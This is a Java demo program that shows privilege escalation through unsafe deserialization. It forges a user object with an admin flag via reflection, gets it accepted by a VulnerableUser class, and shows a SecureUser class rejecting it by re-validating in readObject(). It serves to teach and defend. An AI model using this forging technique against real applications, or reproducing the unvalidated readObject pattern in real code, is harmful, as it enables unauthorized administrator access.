import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Constructor;

public class Exploit {
    public static void main(String[] args) throws IOException, ClassNotFoundException {
        // 1. Demonstrate legitimate user creation (non-admin)
        VulnerableUser regularUser = new VulnerableUser("legituser", false);
        System.out.println("Legitimate user created via constructor: " + regularUser);

        // --- EXPLOIT FOR VULNERABLEUSER ---
        System.out.println("\n--- Exploiting VulnerableUser ---");
        // The goal is to create a VulnerableUser object where isAdmin is true for a non-admin user
        // by bypassing the constructor validation during deserialization.

        // Step 1: Create a malicious VulnerableUser object using reflection to bypass constructor validation.
        // In a real attack, this object would be crafted by an attacker and then serialized.
        VulnerableUser maliciousVulnerableUser = null;
        try {
            // Get the no-argument constructor (which we added to VulnerableUser for this demo)
            Constructor<VulnerableUser> constructor = VulnerableUser.class.getDeclaredConstructor();
            constructor.setAccessible(true);
            maliciousVulnerableUser = constructor.newInstance();

            // Set fields directly using reflection
            Field usernameField = VulnerableUser.class.getDeclaredField("username");
            usernameField.setAccessible(true);
            usernameField.set(maliciousVulnerableUser, "attacker");

            Field isAdminField = VulnerableUser.class.getDeclaredField("isAdmin");
            isAdminField.setAccessible(true);
            isAdminField.set(maliciousVulnerableUser, true);
            System.out.println("Malicious VulnerableUser object crafted via reflection: " + maliciousVulnerableUser);

        } catch (Exception e) {
            System.err.println("Error crafting malicious VulnerableUser object via reflection: " + e.getMessage());
            e.printStackTrace();
            return;
        }

        // Step 2: Serialize the maliciously crafted object.
        ByteArrayOutputStream baosVulnerable = new ByteArrayOutputStream();
        ObjectOutputStream oosVulnerable = new ObjectOutputStream(baosVulnerable);
        oosVulnerable.writeObject(maliciousVulnerableUser);
        oosVulnerable.close();
        byte[] serializedMaliciousData = baosVulnerable.toByteArray();

        System.out.println("\nAttempting to deserialize malicious VulnerableUser object...");

        // Step 3: Deserialize the malicious byte stream as VulnerableUser.
        // The VulnerableUser's readObject() method does not re-validate, so it will accept
        // the manipulated 'isAdmin' flag, creating an unauthorized admin.
        ByteArrayInputStream baisVulnerable = new ByteArrayInputStream(serializedMaliciousData);
        ObjectInputStream oisVulnerable = new ObjectInputStream(baisVulnerable);

        VulnerableUser deserializedMaliciousUser = (VulnerableUser) oisVulnerable.readObject();
        oisVulnerable.close();

        System.out.println("Deserialized malicious user: " + deserializedMaliciousUser);

        if (deserializedMaliciousUser.isAdmin()) {
            System.out.println("\n!!! EXPLOIT SUCCESSFUL: 'attacker' user is now an administrator due to deserialization vulnerability !!!");
        } else {
            System.out.println("Exploit failed: isAdmin is still false or username corrupted.");
        }

        // --- TESTING SECUREUSER ---
        System.out.println("\n--- Testing SecureUser ---");
        SecureUser secureRegularUser = new SecureUser("legituser", false);
        System.out.println("Legitimate secure user created via constructor: " + secureRegularUser);

        // Step 1: Create a malicious SecureUser object using reflection to bypass constructor validation.
        // This object will then be serialized and used to test SecureUser's readObject validation.
        SecureUser maliciousSecureUser = null;
        try {
            // Get the no-argument constructor (which we added to SecureUser for this demo)
            Constructor<SecureUser> constructor = SecureUser.class.getDeclaredConstructor();
            constructor.setAccessible(true);
            maliciousSecureUser = constructor.newInstance();

            // Set fields directly using reflection
            Field usernameField = SecureUser.class.getDeclaredField("username");
            usernameField.setAccessible(true);
            usernameField.set(maliciousSecureUser, "attacker");

            Field isAdminField = SecureUser.class.getDeclaredField("isAdmin");
            isAdminField.setAccessible(true);
            isAdminField.set(maliciousSecureUser, true);
            System.out.println("Malicious SecureUser object crafted via reflection for serialization: " + maliciousSecureUser);

        } catch (Exception e) {
            System.err.println("Error crafting malicious SecureUser object via reflection: " + e.getMessage());
            e.printStackTrace();
            return;
        }

        // Step 2: Serialize the maliciously crafted SecureUser object.
        ByteArrayOutputStream baosSecure = new ByteArrayOutputStream();
        ObjectOutputStream oosSecure = new ObjectOutputStream(baosSecure);
        oosSecure.writeObject(maliciousSecureUser);
        oosSecure.close();
        byte[] serializedMaliciousSecureData = baosSecure.toByteArray();

        System.out.println("\nAttempting to deserialize malicious SecureUser object...");

        // Step 3: Deserialize the malicious byte stream as SecureUser.
        // This should trigger the validation in SecureUser's readObject method and throw an IllegalArgumentException.
        ByteArrayInputStream baisSecure = new ByteArrayInputStream(serializedMaliciousSecureData);
        ObjectInputStream oisSecure = new ObjectInputStream(baisSecure);

        try {
            SecureUser deserializedSecureMaliciousUser = (SecureUser) oisSecure.readObject();
            System.out.println("Deserialized malicious secure user: " + deserializedSecureMaliciousUser);
            if (deserializedSecureMaliciousUser.isAdmin()) {
                System.out.println("SecureUser exploit FAILED: 'attacker' user is an administrator.");
            } else {
                System.out.println("SecureUser successfully prevented privilege escalation (isAdmin is false).");
            }
        } catch (IllegalArgumentException e) {
            System.out.println("SecureUser successfully prevented exploit during deserialization: " + e.getMessage());
        } catch (Exception e) {
            System.out.println("An unexpected error occurred during SecureUser deserialization: " + e.getMessage());
            e.printStackTrace();
        }
        oisSecure.close();
    }
}

